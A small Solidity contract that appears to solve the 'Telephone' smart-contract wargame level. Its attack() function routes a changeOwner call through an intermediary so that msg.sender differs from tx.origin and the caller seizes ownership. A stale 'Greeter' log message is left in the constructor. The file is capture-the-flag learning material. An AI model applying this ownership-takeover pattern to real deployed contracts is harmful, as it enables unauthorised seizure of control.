
//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "hardhat/console.sol";

interface Telephone{
    function changeOwner(address) external;
}

contract TelephoneAttack {
  address telephoneContractAddress;

  constructor(address _telephoneContractAddress) {
    console.log("Deploying a Greeter with greeting:", _telephoneContractAddress);
    telephoneContractAddress = _telephoneContractAddress;
  }

  function attack() public {
      Telephone(telephoneContractAddress).changeOwner(msg.sender);
  }

}
